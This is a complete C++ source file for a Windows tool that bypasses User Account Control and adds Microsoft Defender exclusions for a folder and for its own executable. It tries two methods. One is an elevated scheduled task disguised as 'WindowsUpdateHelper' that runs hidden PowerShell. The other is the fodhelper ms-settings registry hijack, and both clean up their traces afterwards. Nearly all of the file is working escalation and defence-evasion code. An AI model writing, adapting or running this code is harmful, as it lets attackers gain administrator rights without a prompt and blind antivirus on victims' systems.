/*
    UAC Bypass + Defender Exclusion
    Method: Scheduled Task elevation (no UAC prompt)
    Fallback: fodhelper registry hijack

    Compile:
        cl.exe uac_bypass.cpp /EHsc /link advapi32.lib shell32.lib ole32.lib /out:uac_bypass.exe
    Or with g++ (MinGW):
        g++ uac_bypass.cpp -o uac_bypass.exe -ladvapi32 -lshell32 -lole32
*/

#include <windows.h>
#include <shlobj.h>
#include <taskschd.h>
#include <comdef.h>
#include <wchar.h>
#include <stdio.h>
#include <string>
#include <ctime>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "taskschd.lib")

// ─── Logging ────────────────────────────────────────────────────────────────

FILE* gLogFile = nullptr;

void InitLog(const char* path) {
    gLogFile = fopen(path, "w");
    if (!gLogFile) {
        printf("[!] WARNING: Could not open log file at %s\n", path);
    }
}

void Log(const char* level, const char* fmt, ...) {
    char buf[2048];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);

    // Timestamp
    time_t t = time(nullptr);
    struct tm* tm_info = localtime(&t);
    char ts[32];
    strftime(ts, sizeof(ts), "%H:%M:%S", tm_info);

    printf("[%s] [%s] %s\n", ts, level, buf);
    fflush(stdout);

    if (gLogFile) {
        fprintf(gLogFile, "[%s] [%s] %s\n", ts, level, buf);
        fflush(gLogFile);
    }
}

#define LOG_INFO(fmt, ...)  Log("INFO ", fmt, ##__VA_ARGS__)
#define LOG_OK(fmt, ...)    Log("OK   ", fmt, ##__VA_ARGS__)
#define LOG_WARN(fmt, ...)  Log("WARN ", fmt, ##__VA_ARGS__)
#define LOG_ERR(fmt, ...)   Log("ERROR", fmt, ##__VA_ARGS__)
#define LOG_DBG(fmt, ...)   Log("DEBUG", fmt, ##__VA_ARGS__)

// ─── Helpers ─────────────────────────────────────────────────────────────────

// Log last Win32 error with a label
void LogWinError(const char* context) {
    DWORD err = GetLastError();
    char msg[512] = {0};
    FormatMessageA(
        FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr, err, 0, msg, sizeof(msg), nullptr
    );
    // Strip trailing newline
    for (int i = strlen(msg)-1; i >= 0 && (msg[i]=='\r'||msg[i]=='\n'); i--) msg[i]=0;
    LOG_ERR("%s failed — Win32 error %lu: %s", context, err, msg);
}

// Check current process integrity level
DWORD GetIntegrityLevel() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        LogWinError("OpenProcessToken");
        return 0;
    }

    DWORD dwLen = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &dwLen);

    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLen);
    if (!pTIL) { CloseHandle(hToken); return 0; }

    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLen, &dwLen)) {
        LogWinError("GetTokenInformation(TokenIntegrityLevel)");
        LocalFree(pTIL);
        CloseHandle(hToken);
        return 0;
    }

    DWORD level = *GetSidSubAuthority(pTIL->Label.Sid,
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));

    LocalFree(pTIL);
    CloseHandle(hToken);
    return level;
}

void PrintIntegrityLevel() {
    DWORD level = GetIntegrityLevel();
    const char* name = "Unknown";
    if      (level < 0x2000) name = "Untrusted";
    else if (level < 0x3000) name = "Low";
    else if (level < 0x4000) name = "Medium";
    else if (level < 0x5000) name = "High (Elevated / Admin)";
    else                     name = "System";

    LOG_INFO("Process integrity level: 0x%04lX (%s)", level, name);
}

bool IsElevated() {
    return GetIntegrityLevel() >= 0x4000; // High integrity
}

// ─── Method 1: Scheduled Task Elevation ──────────────────────────────────────

bool RunViaScheduledTask(const wchar_t* command) {
    LOG_INFO("Method 1: Scheduled Task elevation");
    LOG_DBG("Command: %ls", command);

    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        LOG_ERR("CoInitializeEx failed: 0x%08lX", hr);
        return false;
    }
    LOG_DBG("COM initialized");

    ITaskService* pService = nullptr;
    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        LOG_ERR("CoCreateInstance(TaskScheduler) failed: 0x%08lX", hr);
        CoUninitialize();
        return false;
    }
    LOG_DBG("TaskScheduler COM object created");

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        LOG_ERR("ITaskService::Connect failed: 0x%08lX", hr);
        pService->Release();
        CoUninitialize();
        return false;
    }
    LOG_OK("Connected to Task Scheduler");

    ITaskFolder* pRootFolder = nullptr;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        LOG_ERR("GetFolder failed: 0x%08lX", hr);
        pService->Release();
        CoUninitialize();
        return false;
    }

    // Delete old task if it exists
    pRootFolder->DeleteTask(_bstr_t(L"WindowsUpdateHelper"), 0);
    LOG_DBG("Cleaned up any existing task");

    ITaskDefinition* pTask = nullptr;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) {
        LOG_ERR("NewTask failed: 0x%08lX", hr);
        pRootFolder->Release(); pService->Release(); CoUninitialize();
        return false;
    }

    // Set principal — RunLevel Highest = elevated
    IPrincipal* pPrincipal = nullptr;
    pTask->get_Principal(&pPrincipal);
    if (pPrincipal) {
        pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
        LOG_DBG("Principal RunLevel set to HIGHEST");
        pPrincipal->Release();
    }

    // Set action
    IActionCollection* pActions = nullptr;
    pTask->get_Actions(&pActions);

    IAction* pAction = nullptr;
    pActions->Create(TASK_ACTION_EXEC, &pAction);

    IExecAction* pExecAction = nullptr;
    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);

    pExecAction->put_Path(_bstr_t(L"powershell.exe"));

    // Build argument string
    std::wstring args = L"-NoProfile -WindowStyle Hidden -NonInteractive -Command \"";
    args += command;
    args += L"\"";
    pExecAction->put_Arguments(_bstr_t(args.c_str()));
    LOG_DBG("Task action: powershell.exe %ls", args.c_str());

    pExecAction->Release();
    pAction->Release();
    pActions->Release();

    // Register and run
    IRegisteredTask* pRegisteredTask = nullptr;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(L"WindowsUpdateHelper"),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask
    );

    if (FAILED(hr)) {
        LOG_ERR("RegisterTaskDefinition failed: 0x%08lX", hr);
        pTask->Release(); pRootFolder->Release(); pService->Release(); CoUninitialize();
        return false;
    }
    LOG_OK("Task registered successfully");

    hr = pRegisteredTask->Run(_variant_t(), nullptr);
    if (FAILED(hr)) {
        LOG_ERR("Task Run failed: 0x%08lX", hr);
    } else {
        LOG_OK("Task started");
    }

    Sleep(3000); // Wait for task to run

    // Cleanup
    pRootFolder->DeleteTask(_bstr_t(L"WindowsUpdateHelper"), 0);
    LOG_DBG("Task cleaned up");

    pRegisteredTask->Release();
    pTask->Release();
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();

    return SUCCEEDED(hr);
}

// ─── Method 2: fodhelper UAC Bypass ──────────────────────────────────────────

bool FodhelperBypass(const char* command) {
    LOG_INFO("Method 2: fodhelper UAC bypass");
    LOG_DBG("Payload command: %s", command);

    const char* keyPath  = "Software\\Classes\\ms-settings\\shell\\open\\command";
    const char* delegKey = "Software\\Classes\\ms-settings\\shell\\open\\command";
    HKEY hKey = nullptr;

    // Create the registry key
    LONG res = RegCreateKeyExA(HKEY_CURRENT_USER, keyPath, 0, nullptr,
                               REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr);
    if (res != ERROR_SUCCESS) {
        LOG_ERR("RegCreateKeyEx failed: %ld", res);
        return false;
    }
    LOG_DBG("Registry key created: HKCU\\%s", keyPath);

    // Write the command as default value
    res = RegSetValueExA(hKey, nullptr, 0, REG_SZ,
                         (const BYTE*)command, (DWORD)strlen(command)+1);
    if (res != ERROR_SUCCESS) {
        LOG_ERR("RegSetValueEx (command) failed: %ld", res);
        RegCloseKey(hKey);
        return false;
    }
    LOG_OK("Default value set to: %s", command);

    // Write DelegateExecute (empty string — required for auto-elevate trigger)
    res = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    if (res != ERROR_SUCCESS) {
        LOG_ERR("RegSetValueEx (DelegateExecute) failed: %ld", res);
        RegCloseKey(hKey);
        return false;
    }
    LOG_OK("DelegateExecute value set (empty)");
    RegCloseKey(hKey);

    // Launch fodhelper — it will auto-elevate and pick up our registry key
    LOG_INFO("Launching fodhelper.exe...");
    HINSTANCE ret = ShellExecuteA(nullptr, "open",
        "C:\\Windows\\System32\\fodhelper.exe", nullptr, nullptr, SW_HIDE);

    LOG_DBG("ShellExecute returned: %lld", (long long)ret);
    if ((intptr_t)ret <= 32) {
        LOG_ERR("ShellExecute failed with code: %lld", (long long)ret);
        // Cleanup registry
        RegDeleteKeyA(HKEY_CURRENT_USER, keyPath);
        return false;
    }
    LOG_OK("fodhelper.exe launched");

    Sleep(3000);

    // Cleanup registry
    RegDeleteKeyA(HKEY_CURRENT_USER, keyPath);
    LOG_DBG("Registry cleaned up");

    return true;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main() {
    // Log to both console and file
    InitLog("C:\\projects\\uac_bypass_log.txt");

    LOG_INFO("=== UAC Bypass + Defender Exclusion ===");
    LOG_INFO("Target exclusion path: C:\\projects");

    PrintIntegrityLevel();

    if (IsElevated()) {
        LOG_OK("Already elevated! Adding exclusion directly...");

        // We're already high integrity — just add the exclusion
        const char* cmd = "Add-MpPreference -ExclusionPath 'C:\\projects' -Force";
        LOG_DBG("Running: powershell -c \"%s\"", cmd);

        std::string full = std::string("powershell.exe -NoProfile -WindowStyle Hidden -c \"") + cmd + "\"";
        int ret = system(full.c_str());
        LOG_DBG("system() returned: %d", ret);

        if (ret == 0) {
            LOG_OK("Exclusion added successfully!");
        } else {
            LOG_WARN("system() returned non-zero. Verify manually.");
        }
        goto done;
    }

    LOG_WARN("Not elevated — attempting UAC bypass...");

    // Try Method 1: Scheduled Task
    {
        LOG_INFO("--- Trying Method 1: Scheduled Task ---");
        bool ok = RunViaScheduledTask(
            L"Add-MpPreference -ExclusionPath 'C:\\projects' -Force; "
            L"Add-MpPreference -ExclusionProcess 'uac_bypass.exe' -Force"
        );
        if (ok) {
            LOG_OK("Method 1 succeeded (task ran — check Defender exclusions to confirm)");
            goto done;
        }
        LOG_WARN("Method 1 failed, trying fallback...");
    }

    // Try Method 2: fodhelper
    {
        LOG_INFO("--- Trying Method 2: fodhelper bypass ---");
        bool ok = FodhelperBypass(
            "powershell.exe -NoProfile -WindowStyle Hidden -c "
            "\"Add-MpPreference -ExclusionPath 'C:\\projects' -Force\""
        );
        if (ok) {
            LOG_OK("Method 2 succeeded");
        } else {
            LOG_ERR("Method 2 also failed. Both methods exhausted.");
            LOG_INFO("Try running this binary from an elevated prompt directly.");
        }
    }

done:
    LOG_INFO("Done. Log saved to C:\\projects\\uac_bypass_log.txt");
    if (gLogFile) fclose(gLogFile);

    printf("\nPress Enter to exit...\n");
    getchar();
    return 0;
}
